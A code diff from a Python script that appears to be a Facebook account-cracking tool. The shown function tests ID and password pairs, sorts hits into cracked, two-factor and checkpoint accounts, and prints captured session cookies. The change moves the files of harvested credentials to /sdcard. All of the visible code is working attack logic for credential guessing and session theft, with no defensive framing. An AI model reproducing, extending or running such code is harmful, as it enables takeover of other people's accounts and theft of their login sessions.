@@ -176,7 +176,7 @@ def file_c(ids,names,p_list):
                 print('\r\033[1;92m [JANNAT-OK] '+ids+' | '+pas)
                 wrt = (ids+' | '+pas)
                 ok.append(wrt)
-                open('jam-ok.txt' , 'a').write('%s\n' % wrt)
+                open('/sdcard/jam-ok.txt' , 'a').write('%s\n' % wrt)
                 try:
                     cokei = ";".join(i["name"]+"="+i["value"] for i in resp.json()["session_cookies"])
                     print(' [ 🍪 ] '+cokei)
@@ -188,13 +188,13 @@ def file_c(ids,names,p_list):
                 print('\r\033[1;96m [JANNAT-2F] '+ids+' | '+pas)
                 wrt = (ids+' | '+pas)
                 sms.append(wrt)
-                open('jam-2f.txt' , 'a').write('%s\n' % wrt)
+                open('/sdcard/jam-2f.txt' , 'a').write('%s\n' % wrt)
                 break
             elif 'checkpoint' in resp.text:
                 print('\r\033[1;93m [JANNAT-CP] '+ids+' | '+pas)
                 wrt = (ids+' | '+pas)
                 cp.append(wrt)
-                open('jam-cp.txt' , 'a').write('%s\n' % wrt)
+                open('/sdcard/jam-cp.txt' , 'a').write('%s\n' % wrt)
                 break
             else:
                 continue
